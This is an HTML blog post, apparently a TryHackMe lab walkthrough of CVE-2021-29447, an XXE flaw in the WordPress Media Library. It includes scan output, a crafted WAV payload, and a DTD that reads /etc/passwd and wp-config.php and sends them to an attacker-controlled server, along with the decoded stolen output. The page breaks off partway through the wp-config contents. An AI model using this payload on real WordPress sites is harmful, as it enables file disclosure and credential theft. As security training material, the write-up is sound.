@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    
+    <!-- Meta Tag -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    
+    <!-- SEO -->
+    <meta name="description" content="150 words">
+    <meta name="author" content="sunums">
+    <meta name="url" content=#>
+    <meta name="copyright" content="sunums">
+    <meta name="robots" content="index,follow">
+    
+    
+    <title>SMS Blog</title>
+    
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="images/favicon/favicon.png">
+    <link rel="apple-touch-icon" sizes="144x144" type="image/x-icon" href="images/favicon/favicon.png">
+    
+    <!-- All CSS Plugins -->
+    <link rel="stylesheet" type="text/css" href="css/plugin.css">
+    
+    <!-- Main CSS Stylesheet -->
+    <link rel="stylesheet" type="text/css" href="css/style.css">
+    
+    <!-- Google Web Fonts  -->
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,300,500,600,700">
+    
+    
+
+
+  </head>
+
+ <body>
+
+    
+     
+     <!-- Preloader Start -->
+     <div class="preloader">
+       <div class="rounder"></div>
+      </div>
+      <!-- Preloader End -->
+      
+      
+    
+    
+    <div id="main">
+        <div class="container">
+            <div class="row">
+                
+               
+                 
+                 <!-- About Me (Left Sidebar) Start -->
+                 <div class="col-md-3">
+                   <div class="about-fixed">
+                    
+                     <div class="my-pic">
+                        <img src="images/pic/" alt="">
+                        <a href="javascript:void(0)" class="collapsed" data-target="#menu" data-toggle="collapse"><i class="icon-menu menu"></i></a>
+                         <div id="menu" class="collapse">
+                           <ul class="menu-link">
+                               <li><a href="#">About</a></li>
+                               <li><a href="#">Work</a></li>
+                               <li><a href="#">Contact</a></li>
+                            </ul>
+                         </div>
+                        </div>
+                      
+                      
+                      
+                      <div class="my-detail">
+                        
+                        <div class="white-spacing">
+                            <h1>Sunu M S</h1>
+                            <span>Cyber Security </span>
+                        </div> 
+                       
+                       <ul class="social-icon">
+                         <li><a href="#" target="_blank" class="facebook"><i class="fa fa-facebook"></i></a></li>
+                         <li><a href="#" target="_blank" class="twitter"><i class="fa fa-twitter"></i></a></li>
+                         <li><a href="https://www.linkedin.com/in/sunu-m-s/" class="linkedin"><i class="fa fa-linkedin"></i></a></li>
+                         <li><a href="https://github.com/sunums"  class="github"><i class="fa fa-github"></i></a></li>
+                        </ul>
+                    </div>
+                  </div>
+                </div>
+                <!-- About Me (Left Sidebar) End -->
+
+                  <!-- Blog Post (Right Sidebar) Start -->
+                 <div class="col-md-9">
+                    <div class="col-md-12 page-body">
+                      <div class="row">
+                        
+                            
+                            <div class="sub-title">
+                              <a href="index.html" title="Go to Home Page"><h2>Back Home</h2></a>
+                                <a href="#comment" class="smoth-scroll"><i class="icon-bubbles"></i></a>
+                             </div>
+                            
+                            
+                            <div class="col-md-12 content-page">
+                              <div class="col-md-12 blog-post">
+                              
+                                
+                                <!-- Post Headline Start -->
+                                <div class="post-title">
+                                    <h1>THM:Wordpress-CVE-2021-29447</h1> 
+                                   </div>
+                                   <!-- Post Headline End -->
+                                    
+                                    
+                                <!-- Post Detail Start -->
+                                <div class="post-info">
+                                    <span>Jun 21 2022 / by <a href="#" target="_blank">sunums</a></span>
+                                   </div>
+                                   <!-- Post Detail End -->
+
+
+
+
+<p><strong>Task 1:Introduction</strong></p>
+<pre><code>Researchers <span class="hljs-keyword">at</span> security firm SonarSource discovered an XML external entity injection (XXE) security flaw <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> WordPress Media Library. The vulnerability can be exploited only when this CMS runs <span class="hljs-keyword">in</span> PHP <span class="hljs-number">8</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">the</span> attacking user has permissions <span class="hljs-keyword">to</span> upload media files
+
+Impact
+    Arbitrary File Disclosure: The <span class="hljs-built_in">contents</span> <span class="hljs-keyword">of</span> any <span class="hljs-built_in">file</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> host’s <span class="hljs-built_in">file</span> system could be retrieved, e.g. wp-config.php which <span class="hljs-keyword">contains</span> sensitive data such <span class="hljs-keyword">as</span> database credentials.
+    Server-Side Request Forgery (SSRF): HTTP requests could be made <span class="hljs-keyword">on</span> behalf <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> WordPress installation. Depending <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> environment, this can have a serious impact.
+</code></pre><p><strong>Task 2:Ready Set Go</strong></p>
+<p><strong>Reconnaissance</strong></p>
+<p>Nmap</p>
+<pre><code>---&gt;nmap -sV -sC  <span class="hljs-number">10.10</span><span class="hljs-number">.128</span><span class="hljs-number">.179</span> 
+Starting Nmap <span class="hljs-number">7.92</span> ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2022</span><span class="hljs-number">-06</span><span class="hljs-number">-20</span> <span class="hljs-number">16</span>:<span class="hljs-number">44</span> IST
+Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.128</span><span class="hljs-number">.179</span>
+Host is up (<span class="hljs-number">0.18</span>s latency).
+Not shown: <span class="hljs-number">997</span> closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+<span class="hljs-number">22</span>/tcp   open  ssh     OpenSSH <span class="hljs-number">7.2</span>p2 Ubuntu <span class="hljs-number">4</span>ubuntu2<span class="hljs-number">.10</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
+| <span class="hljs-type">ssh</span>-hostkey: 
+|   <span class="hljs-type">2048</span> f0:<span class="hljs-number">65</span>:b8:<span class="hljs-number">42</span>:b7:c3:ba:<span class="hljs-number">8</span>e:fe:e4:<span class="hljs-number">3</span>c:cd:<span class="hljs-number">57</span>:f1:<span class="hljs-number">29</span>:<span class="hljs-number">2</span>e (RSA)
+|   <span class="hljs-type">256</span> <span class="hljs-number">42</span>:<span class="hljs-number">1</span>e:<span class="hljs-number">1</span>b:<span class="hljs-number">8</span>f:<span class="hljs-number">19</span>:<span class="hljs-number">38</span>:<span class="hljs-number">99</span>:<span class="hljs-number">2</span>e:<span class="hljs-number">36</span>:<span class="hljs-number">70</span>:cf:<span class="hljs-number">0</span>e:b6:<span class="hljs-number">31</span>:<span class="hljs-number">92</span>:<span class="hljs-number">14</span> (ECDSA)
+|<span class="hljs-type">_</span>  <span class="hljs-number">256</span> <span class="hljs-number">8</span>e:<span class="hljs-number">89</span>:<span class="hljs-number">43</span>:de:<span class="hljs-number">5</span>d:<span class="hljs-number">9</span>b:<span class="hljs-number">99</span>:<span class="hljs-number">66</span>:c4:<span class="hljs-number">2</span>a:<span class="hljs-number">93</span>:<span class="hljs-number">17</span>:f3:<span class="hljs-number">0</span>e:e1:f4 (ED25519)
+<span class="hljs-number">80</span>/tcp   open  http    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.18</span> ((Ubuntu))
+|<span class="hljs-type">_http</span>-title: Tryhackme &amp;#<span class="hljs-number">8211</span>; Just another WordPress site
+|<span class="hljs-type">_http</span>-generator: WordPress <span class="hljs-number">5.6</span><span class="hljs-number">.2</span>
+|<span class="hljs-type">_http</span>-server-header: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.18</span> (Ubuntu)
+[Redacted] /tcp open  mysql   [Redacted] <span class="hljs-number">-0</span>ubuntu0<span class="hljs-number">.16</span><span class="hljs-number">.04</span><span class="hljs-number">.1</span>
+| <span class="hljs-type">mysql</span>-info: 
+|   <span class="hljs-type">Protocol</span>: <span class="hljs-number">10</span>
+|   <span class="hljs-type">Version</span>: <span class="hljs-number">5.7</span><span class="hljs-number">.33</span><span class="hljs-number">-0</span>ubuntu0<span class="hljs-number">.16</span><span class="hljs-number">.04</span><span class="hljs-number">.1</span>
+|   <span class="hljs-type">Thread</span> ID: <span class="hljs-number">8</span>
+|   <span class="hljs-type">Capabilities</span> flags: <span class="hljs-number">65535</span>
+|   <span class="hljs-type">Some</span> Capabilities: LongPassword, ConnectWithDatabase, Support41Auth, Speaks41ProtocolOld, FoundRows, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, LongColumnFlag, InteractiveClient, SupportsCompression, SwitchToSSLAfterHandshake, IgnoreSigpipes, SupportsTransactions, Speaks41ProtocolNew, ODBCClient, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
+|   <span class="hljs-type">Status</span>: Autocommit
+|   <span class="hljs-type">Salt</span>: V3M`q\x02ZCk\x0D\x1Eq\x1EfN1u)\x0E\x1D
+|<span class="hljs-type">_</span>  Auth Plugin Name: mysql_native_password
+| <span class="hljs-type">ssl</span>-cert: Subject: commonName=[Redacted] _Auto_Generated_Server_Certificate
+| <span class="hljs-type">Not</span> valid <span class="hljs-built_in">before</span>: <span class="hljs-number">2021</span><span class="hljs-number">-05</span><span class="hljs-number">-26</span>T21:<span class="hljs-number">23</span>:<span class="hljs-number">31</span>
+|<span class="hljs-type">_Not</span> valid <span class="hljs-built_in">after</span>:  <span class="hljs-number">2031</span><span class="hljs-number">-05</span><span class="hljs-number">-24</span>T21:<span class="hljs-number">23</span>:<span class="hljs-number">31</span>
+|<span class="hljs-type">_ssl</span>-date: TLS randomness does not represent <span class="hljs-built_in">time</span>
+Service <span class="hljs-keyword">Info</span>: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p><strong><em>Investigation port 80</em></strong></p>
+<p><code>http://10.10.128.179/</code>
+</p>
+           <!-- Post Image Start -->
+                                <div class="post-image margin-top-40 margin-bottom-40">
+                                   <img src="images/writeup/CVE-2021-29447/inti.png" alt="">
+                                                                         
+                                  </div>
+                                  <!-- Post Image End -->
+
+
+
+
+<p>A wordpress boilerplate !!</p>
+<p><strong><em>Running wpscan</em></strong>
+<code>wpscan --url 10.10.128.179 -e</code></p>
+<p>Interesting  result</p>
+<pre><code>[+] WordPress <span class="hljs-keyword">version</span> <span class="hljs-number">5.6</span>.<span class="hljs-number">2</span> identified (Insecure, released <span class="hljs-keyword">on</span> <span class="hljs-number">2021</span>-<span class="hljs-number">02</span>-<span class="hljs-number">22</span>).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://<span class="hljs-number">10.10</span>.<span class="hljs-number">128.179</span>/<span class="hljs-built_in">index</span>.php/feed/, <span class="hljs-symbol">&lt;generator&gt;</span>http<span class="hljs-variable">s:</span>//wordpress.org/?v=<span class="hljs-number">5.6</span>.<span class="hljs-number">2</span>&lt;/generator&gt;
+ |  - http://<span class="hljs-number">10.10</span>.<span class="hljs-number">128.179</span>/<span class="hljs-built_in">index</span>.php/comments/feed/, <span class="hljs-symbol">&lt;generator&gt;</span>http<span class="hljs-variable">s:</span>//wordpress.org/?v=<span class="hljs-number">5.6</span>.<span class="hljs-number">2</span>&lt;/generator&gt;
+</code></pre><p><strong><em>checking for any known exploit</em></strong></p>
+<pre><code>WordPress version is <span class="hljs-number">5.6</span><span class="hljs-number">.2</span>
+CVE<span class="hljs-number">-2021</span><span class="hljs-number">-29447</span>
+</code></pre><p>Inorder to work this exploit user shoud be Authenticated.which is in already provided task 1</p>
+<pre><code><span class="hljs-symbol">user:</span> test-corp
+<span class="hljs-symbol">password:</span> test
+</code></pre><p><strong>login wp-admin</strong>
+<code>http://10.10.128.179/wp-admin/</code>
+
+  <!-- Post Image Start -->
+                                <div class="post-image margin-top-40 margin-bottom-40">
+                                   <img src="images/writeup/CVE-2021-29447/wp-login.png" alt="">
+                                                                         
+                                  </div>
+                                  <!-- Post Image End -->  
+                                  <!-- Post Image Start -->
+                                <div class="post-image margin-top-40 margin-bottom-40">
+                                   <img src="images/writeup/CVE-2021-29447/media_location.png" alt="">
+                                                                         
+                                  </div>
+                                  <!-- Post Image End -->
+<strong><em>Exploit</em></strong>
+[image]</p>
+<p>+creating playload in Hacker system</p>
+<p><code>nano poc.wav
+echo -en &#39;RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;&quot;&#39;&quot;&#39;http://YOURSEVERIP:PORT/NAMEEVIL.dtd&#39;&quot;&#39;&quot;&#39;&gt;%remote;%init;%trick;]&gt;\x00&#39; &gt; payload.wav</code></p>
+<p>+Run the file generate <code>payload.wav</code></p>
+<p>nb:Be sure the name of this file matches what you put entered in the .wav file for NAMEEVIL.dtd</p>
+<p>+creating  NAMEEVIL.dtd </p>
+<pre><code><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">file</span> <span class="hljs-attr">SYSTEM</span> "<span class="hljs-attr">php:</span>//<span class="hljs-attr">filter</span>/<span class="hljs-attr">zlib.deflate</span>/<span class="hljs-attr">read</span>=<span class="hljs-string">convert.base64-encode/resource</span>=<span class="hljs-string">/etc/passwd</span>"&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">init</span> "&lt;!<span class="hljs-attr">ENTITY</span> &amp;#<span class="hljs-attr">x25</span>; <span class="hljs-attr">trick</span> <span class="hljs-attr">SYSTEM</span> '<span class="hljs-attr">http:</span>//<span class="hljs-attr">YOURSERVERIP:PORT</span>/?<span class="hljs-attr">p</span>=<span class="hljs-string">%file;</span>'&gt;</span>" &gt;</span>
+</code></pre><p>http server at same place where this .dtd file saved
+<code>php -S 0.0.0.0:PORT</code></p>
+
+<p><strong>Payload Result</strong></p>
+<pre><code>(<span class="hljs-keyword">null</span>) <span class="hljs-regexp">/?p=hVTbjpswEH3fr+CxlYLMLTc/</span>blX1ZVO1m6qvlQNeYi3Y1IZc+vWd8RBCF1aVDZrxnDk+<span class="hljs-number">9</span>gxYY1p+<span class="hljs-number">4</span>REMiyaj90FpdhDu+FAIWRsNiBhG77DOWeYAcreYNpUplX7A1QtPYPj4PMhdHYBSGGixQp5mQToHVMZXy2Wace+yGylD96EUtUSmJV9FnBzPMzL<span class="hljs-regexp">/oawFilvxOOFospOwLBf5UTLvTvBVA/</span>A1DDA82DXGVKxqillyVQF8A8ObPoGsCVbLM+rewvDmiJz8SUbX5SgmjnB6Z5RD<span class="hljs-regexp">/iSnseZyxaQUJ3nvVOR8PoeFaAWWJcU5LPhtwJurtchfO1QF5YHZuz6B7LmDVMphw6UbnDu4HqXL4AkWg53QopSWCDxsmq0s9kS6xQl2QWDbaUbeJKHUosWrzmKcX9ALHrsyfJaNsS3uvb+6VtbBB1HUSn+87X5glDlTO3MwBV4r9SW9+0UAaXkB6VLPqXd+qyJsFfQntXccYUUT3oeCHxACSTo/</span>WqPVH9EqoxeLBfdn7EH0BbyIysmBUsv2bOyrZ4RPNUoHxq8U6a+<span class="hljs-number">3</span>BmVv+aDnWvUyx2qlM9VJetYEnmxgfaaInXDdUmbYDp0Lh54EhXG0HPgeOxd8w9h<span class="hljs-regexp">/DgsX6bMzeDacs6OpJevXR8hfomk9btkX6E1p7kiohIN7AW0eDz8H+MDubVVgYATvOlUUHrkGZMxJK62Olbbdhaob0evTz89hEiVxmGyzbO0PSdIReP/</span>dOnck9s2g+<span class="hljs-number">6</span>bEh2Z+O1f3u<span class="hljs-regexp">/IpWxC05rvr/</span>vtTsJf2Vpx3zv0X - No such <span class="hljs-keyword">file</span> or directory</code></pre><p>
+
+<p><strong>Decode the result</strong></p>
+<p>+using cyberchef</p>
+<pre><code><span class="hljs-attr">recipe</span>=From_Base64(<span class="hljs-string">'A-Za-z0-9%2B/%3D'</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>)Raw_Inflate(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-string">''</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>)&amp;input=aFZUYmpwc3dFSDNmcitDeGxZTE1MVGMvYmxYMVpWTzFtNnF2bFFOZVlpM1kxSVpjK3ZXZDhSQkNGMWFWRFpyeG5Eays5Z3hZWTFwKzRSRU1peWFqOTBGcGRoRHUrRkFJV1JzTmlCaEc3N0RPV2VZQWNyZVlOcFVwbFg3QTFRdFBZUGo0UE1oZEhZQlNHR2l4UXA1bVFUb0hWTVpYeTJXYWNlK3lHeWxEOTZFVXRVU21KVjlGbkJ6UE16TC9vYXdGaWx2eE9PRm9zcE93TEJmNVVUTHZUdkJWQS9BMUREQTgyRFhHVkt4cWlsbHlWUUY4QThPYlBvR3NDVmJMTStyZXd2RG1pSno4U1ViWDVTZ21qbkI2WjVSRC9pU25zZVp5eGFRVUozbnZWT1I4UG9lRmFBV1dKY1U1TFBodHdKdXJ0Y2hmTzFRRjVZSFp1ejZCN0xtRFZNcGh3NlVibkR1NEhxWEw0QWtXZzUzUW9wU1dDRHhzbXEwczlrUzZ4UWwyUVdEYmFVYmVKS0hVb3NXcnptS2NYOUFMSHJzeWZKYU5zUzN1dmIrNlZ0YkJCMUhVU24rODdYNWdsRGxUTzNNd0JWNHI5U1c5KzBVQWFYa0I2VkxQcVhkK3F5SnNGZlFudFhjY1lVVVQzb2VDSHhBQ1NUby9XcVBWSDlFcW94ZUxCZmRuN0VIMEJieUl5c21CVXN2MmJPeXJaNFJQTlVvSHhxOFU2YSszQm1WdithRG5XdlV5eDJxbE05VkpldFlFbm14Z2ZhYUluWERkVW1iWURwMExoNTRFaFhHMEhQZ2VPeGQ4dzloL0Rnc1g2Yk16ZURhY3M2T3BKZXZYUjhoZm9tazlidGtYNkUxcDdraW9oSU43QVcwZUR6OEgrTUR1YlZWZ1lBVHZPbFVVSHJrR1pNeEpLNjJPbGJiZGhhb2IwZXZUejg5aEVpVnhtR3l6Yk8wUFNkSVJlUC9kT25jazlzMmcrNmJFaDJaK08xZjN1L0lwV3hDMDVydnIvdnRUc0pmMlZweDN6djBY
+</code></pre><p><strong>Result</strong></p>
+<pre><code><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span>
+<span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span>
+<span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> List <span class="hljs-symbol">Manager:</span>/var/<span class="hljs-symbol">list:</span>/usr/sbin/nologin
+<span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> Bug-Reporting System (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+systemd-<span class="hljs-symbol">timesync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">102</span><span class="hljs-symbol">:systemd</span> Time Synchronization,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span>
+systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">103</span><span class="hljs-symbol">:systemd</span> Network Management,,,<span class="hljs-symbol">:/run/systemd/netif</span><span class="hljs-symbol">:/bin/false</span>
+systemd-<span class="hljs-symbol">resolve:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:systemd</span> Resolver,,,<span class="hljs-symbol">:/run/systemd/resolve</span><span class="hljs-symbol">:/bin/false</span>
+systemd-bus-<span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">105</span><span class="hljs-symbol">:systemd</span> Bus Proxy,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span>
+<span class="hljs-symbol">syslog:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">108</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/syslog</span><span class="hljs-symbol">:/bin/false</span>
+<span class="hljs-symbol">_apt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span>
+<span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/run/dbus</span><span class="hljs-symbol">:/bin/false</span>
+<span class="hljs-symbol">uuidd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-number">111</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/run/uuidd</span><span class="hljs-symbol">:/bin/false</span>
+<span class="hljs-symbol">stux:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:CVE-</span><span class="hljs-number">2021</span>-<span class="hljs-number">29447</span>,,,<span class="hljs-symbol">:/home/stux</span><span class="hljs-symbol">:/bin/bash</span>
+<span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">108</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/run/sshd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">109</span><span class="hljs-symbol">:</span><span class="hljs-number">117</span><span class="hljs-symbol">:MySQL</span> Server,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span>
+</code></pre><p>Replace <code>resource=/etc/passwd</code> to <code>resource=../wp-config.php</code>  in file NAMEEVIL.dtd and follow above steps</p>
+<p>we get <code>wp-config.php</code> as</p>
+<pre><code>&lt;?php
+<span class="hljs-comment">/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to "wp-config.php" and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/support/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */</span>
+
+<span class="hljs-comment">// ** MySQL settings - You can get this info from your web host ** //</span>
+<span class="hljs-comment">/** The name of the database for WordPress */</span>
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'DB_NAME'</span>, <span class="hljs-string">'[Redacted] '</span> );
+
+<span class="hljs-comment">/** MySQL database username */</span>
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'DB_USER'</span>, <span class="hljs-string">'[Redacted] '</span> );
+
+<span class="hljs-comment">/** MySQL database password */</span>
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'DB_PASSWORD'</span>, <span class="hljs-string">'[Redacted] '</span> );
+
+<span class="hljs-comment">/** MySQL hostname */</span>
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'DB_HOST'</span>, <span class="hljs-string">'localhost'</span> );
+
+<span class="hljs-comment">/** Database Charset to use in creating database tables. */</span>
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'DB_CHARSET'</span>, <span class="hljs-string">'utf8'</span> );
+
+<span class="hljs-comment">/** The Database Collate type. Don't change this if in doubt. */</span>
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'DB_COLLATE'</span>, <span class="hljs-string">''</span> );
+
+<span class="hljs-comment">/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */</span>
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'AUTH_KEY'</span>,         <span class="hljs-string">'put your unique phrase here'</span> );
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'SECURE_AUTH_KEY'</span>,  <span class="hljs-string">'put your unique phrase here'</span> );
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'LOGGED_IN_KEY'</span>,    <span class="hljs-string">'put your unique phrase here'</span> );
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'NONCE_KEY'</span>,        <span class="hljs-string">'put your unique phrase here'</span> );
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'AUTH_SALT'</span>,        <span class="hljs-string">'put your unique phrase here'</span> );
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'SECURE_AUTH_SALT'</span>, <span class="hljs-string">'put your unique phrase here'</span> );
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'LOGGED_IN_SALT'</span>,   <span class="hljs-string">'put your unique phrase here'</span> );
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'NONCE_SALT'</span>,       <span class="hljs-string">'put your unique phrase here'</span> );
+
